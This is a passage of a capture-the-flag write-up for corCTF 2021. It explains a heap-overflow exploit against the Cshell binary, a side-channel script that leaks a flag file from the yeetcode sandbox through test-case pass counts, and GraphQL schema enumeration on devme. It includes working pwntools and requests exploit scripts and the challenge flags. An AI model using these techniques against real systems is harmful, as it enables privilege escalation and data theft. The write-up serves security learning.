+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(root_t</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;root&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	root_t</span><span style="color:#f29e74;">-&gt;</span><span>ptr </span><span style="color:#f29e74;">=</span><span> root</span><span style="color:#ccc9c2cc;">;
+</span><span>	root_t</span><span style="color:#f29e74;">-&gt;</span><span>id </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>	root_t</span><span style="color:#f29e74;">-&gt;</span><span>next </span><span style="color:#f29e74;">=</span><span> user_t</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">setup</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user</span><span style="color:#f29e74;">-&gt;</span><span>passwd</span><span style="color:#ccc9c2cc;">,</span><span>hash)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user_t</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>	user_t</span><span style="color:#f29e74;">-&gt;</span><span>id</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">1000</span><span style="color:#ccc9c2cc;">;
+</span><span>	user_t</span><span style="color:#f29e74;">-&gt;</span><span>ptr </span><span style="color:#f29e74;">=</span><span> user</span><span style="color:#ccc9c2cc;">;
+</span><span>	user_t</span><span style="color:#f29e74;">-&gt;</span><span>next </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>So, the first thing I noted here was that we don't need to exploit for code execution. If we can set uid to 0, it'll just give us a shell. The vulnerability is in the setup function. It asks for the length of our bio buffer, allocates a chunk of that size, and then reads 201 bytes into it for a fairly hefty heap overflow. The issue is that it's essentially the last heap chunk allocated so there isn't anything useful afterwards. We can force it to allocate an earlier chunk by taking advantage of some libc malloc behavior -- that it will reuse previously freed chunks of matching sizes. The heap layout around that area looks something like Alex -&gt; Charlie -&gt; Eric -&gt; User -&gt; Root. Both Charlie and Eric are freed chunks, which means we can get the setup to allocate those chunks again and overflow. At this point we can overwrite the saved password of root, log into root, and then ask politely for a shell.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">##!/usr/bin/env python3
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;Cshell&quot;</span><span>)
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;pwn.be.ax&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5001</span><span>)
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>({
+</span><span>        </span><span style="color:#ffcc66;">187</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;13iAJxIb3oOPs&quot; </span><span style="font-style:italic;color:#5c6773;"># &quot;hi&quot; hashed
+</span><span>    })
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;abcd&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;hi&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;120&quot;</span><span>) </span><span style="font-style:italic;color:#5c6773;"># reuse a previous freed alloc
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;root&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;hi&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;3&quot;</span><span>)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>The flag is corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}</p>
+<h1 id="yeetcode"><a href="/corctf-2021/yeetcode">yeetcode</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Brush up on your coding skills and ace your next interview with YeetCode! Flag is at ./flag.txt
+</span><span>https://yeetcode.be.ax
+</span></code></pre>
+<p>We're provided all the source and a docker file but I've just included the main server file for brevity.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>flask </span><span style="color:#ffa759;">import </span><span>Flask</span><span style="color:#ccc9c2cc;">, </span><span>render_template</span><span style="color:#ccc9c2cc;">, </span><span>request</span><span style="color:#ccc9c2cc;">, </span><span>session
+</span><span style="color:#ffa759;">import </span><span>random</span><span style="color:#ccc9c2cc;">, </span><span>epicbox</span><span style="color:#ccc9c2cc;">, </span><span>os
+</span><span style="font-style:italic;color:#5c6773;">## docker pull 
+</span><span>epicbox</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">configure</span><span>(
+</span><span>    </span><span style="color:#ffcc66;">profiles</span><span style="color:#f29e74;">=</span><span>[
+</span><span>        epicbox</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Profile</span><span>(</span><span style="color:#bae67e;">&#39;python&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;python:3.9.6-alpine&#39;</span><span>)
+</span><span>    ]
+</span><span>)
+</span><span>app </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Flask</span><span>(__name__)
+</span><span>app</span><span style="color:#f29e74;">.</span><span>secret_key </span><span style="color:#f29e74;">= </span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">urandom</span><span>(</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>flag </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&#39;flag.txt&#39;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>()
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">yeet</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;yeet.html&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/yeet&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">yeetyeet</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;yeetyeet.html&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/yeetyeet&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods</span><span style="color:#f29e74;">=</span><span>[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">yeetyeetyeet</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#bae67e;">&#39;run&#39; </span><span style="color:#f29e74;">in </span><span>session </span><span style="color:#f29e74;">and </span><span>session[</span><span style="color:#bae67e;">&#39;run&#39;</span><span>]:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>{</span><span style="color:#bae67e;">&#39;error&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">True</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;msg&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;You already have code running, please wait for it to finish.&#39;</span><span>}
+</span><span>    session[</span><span style="color:#bae67e;">&#39;run&#39;</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">True
+</span><span>    code </span><span style="color:#f29e74;">= </span><span>request</span><span style="color:#f29e74;">.</span><span>data
+</span><span>    tests </span><span style="color:#f29e74;">= </span><span>[(</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span>)]
+</span><span>    </span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>        a, b </span><span style="color:#f29e74;">= </span><span>random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">randint</span><span>(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">100</span><span>), random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">randint</span><span>(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">100</span><span>)
+</span><span>        tests</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>((a</span><span style="color:#ccc9c2cc;">, </span><span>b</span><span style="color:#ccc9c2cc;">, </span><span>a </span><span style="color:#f29e74;">+ </span><span>b))
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># print(code)
+</span><span>    cmd </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;from code import f</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&#39;
+</span><span>    outputs </span><span style="color:#f29e74;">= </span><span>[]
+</span><span>    </span><span style="color:#ffa759;">for </span><span>case </span><span style="color:#ffa759;">in </span><span>tests:
+</span><span>        a, b, ans </span><span style="color:#f29e74;">= </span><span>case
+</span><span>        cmd </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&#39;print(f(</span><span>{a}</span><span style="color:#bae67e;">, </span><span>{b}</span><span style="color:#bae67e;">))</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&#39;
+</span><span>        outputs</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(ans))
+</span><span>    files </span><span style="color:#f29e74;">= </span><span>[{</span><span style="color:#bae67e;">&#39;name&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;flag.txt&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;content&#39;</span><span style="color:#ccc9c2cc;">: </span><span>flag</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>()}</span><span style="color:#ccc9c2cc;">, </span><span>{</span><span style="color:#bae67e;">&#39;name&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;code.py&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;content&#39;</span><span style="color:#ccc9c2cc;">: </span><span>code}]
+</span><span>    limits </span><span style="color:#f29e74;">= </span><span>{</span><span style="color:#bae67e;">&#39;cputime&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;memory&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">16</span><span>}
+</span><span>    result </span><span style="color:#f29e74;">= </span><span>epicbox</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">run</span><span>(</span><span style="color:#bae67e;">&#39;python&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">command</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;python3&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">stdin</span><span style="color:#f29e74;">=</span><span>cmd</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">files</span><span style="color:#f29e74;">=</span><span>files</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">limits</span><span style="color:#f29e74;">=</span><span>limits)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>result[</span><span style="color:#bae67e;">&#39;exit_code&#39;</span><span>] </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>:
+</span><span>        session[</span><span style="color:#bae67e;">&#39;run&#39;</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">False
+</span><span>        </span><span style="color:#ffa759;">return </span><span>{</span><span style="color:#bae67e;">&#39;error&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">True</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;msg&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;Oops! Your code has an error in it. Please try again.&#39;</span><span>}
+</span><span>    actual </span><span style="color:#f29e74;">= </span><span>result[</span><span style="color:#bae67e;">&#39;stdout&#39;</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">strip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&#39;</span><span>)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(actual)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(outputs)
+</span><span>    passes </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>    fails </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#f28779;">len</span><span>(outputs)):
+</span><span>        </span><span style="color:#ffa759;">if </span><span>outputs[i] </span><span style="color:#f29e74;">== </span><span>actual[i]:
+</span><span>            passes </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>        </span><span style="color:#ffa759;">else</span><span>:
+</span><span>            fails </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>    session[</span><span style="color:#bae67e;">&#39;run&#39;</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">False
+</span><span>    </span><span style="color:#ffa759;">return </span><span>{</span><span style="color:#bae67e;">&#39;error&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">False</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;p&#39;</span><span style="color:#ccc9c2cc;">: </span><span>passes</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;f&#39;</span><span style="color:#ccc9c2cc;">: </span><span>fails}
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">run</span><span>(</span><span style="color:#ffcc66;">host</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;0.0.0.0&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">port</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">5000</span><span>)
+</span></code></pre>
+<p>We provided code to run in a sandbox which has access to a flag file, but we don't have access to any response except test case passes and fails. I have no idea if this sandbox allows for network and honestly I didn't think to check so instead you get a good ol binary search (the code for which i stole off the internet bc lazy). The function which is supposed to take two args and return the sum of them, so it's trivial to make it pass when needed and then we just need a condition for our binary search.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>requests
+</span><span style="color:#ffa759;">from </span><span>bisect </span><span style="color:#ffa759;">import </span><span>bisect_left
+</span><span style="font-style:italic;color:#5c6773;">## corctf{1m4g1n3_cp_g0lf_6a318dfe}
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_index</span><span>(</span><span style="color:#ffcc66;">idx</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">val</span><span>):
+</span><span>	code </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;&quot;&quot;
+</span><span style="color:#bae67e;">ch = open(&quot;flag.txt&quot;,&quot;r&quot;).read()[</span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">]
+</span><span style="color:#bae67e;">def f(a, b):
+</span><span style="color:#bae67e;">	if ord(ch) &lt;= </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">:
+</span><span style="color:#bae67e;">		return a + b
+</span><span style="color:#bae67e;">	else: 
+</span><span style="color:#bae67e;">		return False
+</span><span style="color:#bae67e;">	&quot;&quot;&quot; </span><span style="color:#f29e74;">% </span><span>(idx</span><span style="color:#ccc9c2cc;">, </span><span>val)
+</span><span>	headers </span><span style="color:#f29e74;">= </span><span>{
+</span><span>		</span><span style="color:#bae67e;">&#39;Content-Type&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;text/plain;charset=UTF-8&#39;
+</span><span>	}
+</span><span>	url </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;https://yeetcode.be.ax/yeetyeet&quot;
+</span><span>	r </span><span style="color:#f29e74;">= </span><span>requests</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">post</span><span>(url</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">headers</span><span style="color:#f29e74;">=</span><span>headers</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">data </span><span style="color:#f29e74;">= </span><span>code)
+</span><span>	</span><span style="color:#ffa759;">return </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">json</span><span>()[</span><span style="color:#bae67e;">&quot;p&quot;</span><span>] </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">10
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">generic_bisect</span><span>(</span><span style="color:#ffcc66;">idx</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">lo</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">hi</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">None</span><span>):
+</span><span>    </span><span style="color:#ffa759;">if </span><span>lo </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span>:
+</span><span>        </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span>(</span><span style="color:#bae67e;">&#39;lo must be non-negative&#39;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>hi </span><span style="color:#f29e74;">is </span><span style="color:#ffcc66;">None</span><span>:
+</span><span>        hi </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">127
+</span><span>    </span><span style="color:#ffa759;">while </span><span>lo </span><span style="color:#f29e74;">&lt; </span><span>hi:
+</span><span>        mid </span><span style="color:#f29e74;">= </span><span>(lo</span><span style="color:#f29e74;">+</span><span>hi)</span><span style="color:#f29e74;">//</span><span style="color:#ffcc66;">2
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#ffd580;">get_index</span><span>(idx</span><span style="color:#ccc9c2cc;">, </span><span>mid) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">2</span><span>: </span><span style="color:#ffa759;">return </span><span>mid
+</span><span>        </span><span style="color:#ffa759;">elif </span><span style="color:#ffd580;">get_index</span><span>(idx</span><span style="color:#ccc9c2cc;">, </span><span>mid) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">1</span><span>: lo </span><span style="color:#f29e74;">= </span><span>mid</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">1
+</span><span>        </span><span style="color:#ffa759;">else</span><span>: hi </span><span style="color:#f29e74;">= </span><span>mid
+</span><span>    </span><span style="color:#ffa759;">return </span><span>lo
+</span><span>flag </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;&quot;
+</span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>	flag </span><span style="color:#f29e74;">+= </span><span style="color:#f28779;">chr</span><span>(</span><span style="color:#ffd580;">generic_bisect</span><span>(</span><span style="color:#f28779;">len</span><span>(flag)))
+</span><span>	</span><span style="color:#f28779;">print</span><span>(flag)
+</span></code></pre>
+<p>I went off to go get dinner and came back to the flag, corctf{1m4g1n3_cp_g0lf_6a318dfe}</p>
+<h1 id="devme"><a href="/corctf-2021/devme">devme</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>an ex-google, ex-facebook tech lead recommended me this book!
+</span><span>https://devme.be.ax
+</span></code></pre>
+<p>No source provided here; I just clicked around until I found a form which showed me there was an exposed graphql endpoint. I grabbed a query to enumerate the schema from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#extract-data">the internet</a></p>
+<details>
+<summary>Schema</summary>
+<pre lang="json">
+<code>
+	{
+    "data": {
+        "__schema": {
+            "queryType": {
+                "name": "Query"
+            },
+            "mutationType": {
+                "name": "Mutation"
+            },
+            "types": [
+                {
+                    "kind": "OBJECT",
+                    "name": "Query",
+                    "description": null,
+                    "fields": [
+                        {
+                            "name": "users",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "LIST",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "OBJECT",
+                                        "name": "User",
+                                        "ofType": null
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "flag",
+                            "description": null,
+                            "args": [
+                                {
+                                    "name": "token",
+                                    "description": null,
+                                    "type": {
+                                        "kind": "NON_NULL",
+                                        "name": null,
+                                        "ofType": {
+                                            "kind": "SCALAR",
+                                            "name": "String",
+                                            "ofType": null
+                                        }
+                                    },
+                                    "defaultValue": null
+                                }
+                            ],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "String",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "SCALAR",
+                    "name": "String",
+                    "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.",
+                    "fields": null,
+                    "inputFields": null,
+                    "interfaces": null,
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "OBJECT",
+                    "name": "Mutation",
+                    "description": null,
+                    "fields": [
+                        {
+                            "name": "createUser",
+                            "description": null,
+                            "args": [
+                                {
+                                    "name": "email",
+                                    "description": null,
+                                    "type": {
+                                        "kind": "NON_NULL",
+                                        "name": null,
+                                        "ofType": {
+                                            "kind": "SCALAR",
+                                            "name": "String",
+                                            "ofType": null
+                                        }
+                                    },
+                                    "defaultValue": null
+                                }
+                            ],
+                            "type": {
+                                "kind": "OBJECT",
+                                "name": "User",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "OBJECT",
+                    "name": "User",
+                    "description": null,
+                    "fields": [
+                        {
+                            "name": "token",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "String",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "username",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "SCALAR",
+                                    "name": "String",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        }
+                    ],
+                    "inputFields": null,
+                    "interfaces": [],
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "SCALAR",
+                    "name": "Boolean",
+                    "description": "The `Boolean` scalar type represents `true` or `false`.",
+                    "fields": null,
+                    "inputFields": null,
+                    "interfaces": null,
+                    "enumValues": null,
+                    "possibleTypes": null
+                },
+                {
+                    "kind": "OBJECT",
+                    "name": "__Schema",
+                    "description": "A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations.",
+                    "fields": [
+                        {
+                            "name": "description",
+                            "description": null,
+                            "args": [],
+                            "type": {
+                                "kind": "SCALAR",
+                                "name": "String",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "types",
+                            "description": "A list of all types supported by this server.",
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "LIST",
+                                    "name": null,
+                                    "ofType": {
+                                        "kind": "NON_NULL",
+                                        "name": null,
+                                        "ofType": {
+                                            "kind": "OBJECT",
+                                            "name": "__Type",
+                                            "ofType": null
+                                        }
+                                    }
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "queryType",
+                            "description": "The type that query operations will be rooted at.",
+                            "args": [],
+                            "type": {
+                                "kind": "NON_NULL",
+                                "name": null,
+                                "ofType": {
+                                    "kind": "OBJECT",
+                                    "name": "__Type",
+                                    "ofType": null
+                                }
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
+                            "name": "mutationType",
+                            "description": "If this server supports mutation, the type that mutation operations will be rooted at.",
+                            "args": [],
+                            "type": {
+                                "kind": "OBJECT",
+                                "name": "__Type",
+                                "ofType": null
+                            },
+                            "isDeprecated": false,
+                            "deprecationReason": null
+                        },
+                        {
